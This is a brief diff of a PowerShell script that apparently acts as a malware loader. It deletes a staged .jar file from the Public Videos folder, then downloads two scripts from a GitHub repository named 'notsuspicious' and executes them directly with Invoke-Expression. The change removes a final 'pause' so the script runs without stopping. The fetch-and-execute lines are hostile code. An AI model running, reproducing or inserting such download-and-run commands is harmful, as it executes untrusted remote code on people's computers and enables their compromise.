@@ -11,4 +11,3 @@ Copy-Item -Path $sourceFile -Destination $destinationFolder
 Remove-Item -Path C:\Users\Public\Videos\downloadnew.jar -Force
 Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing).Content
 Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/move.ps1" -UseBasicParsing).Content
-pause
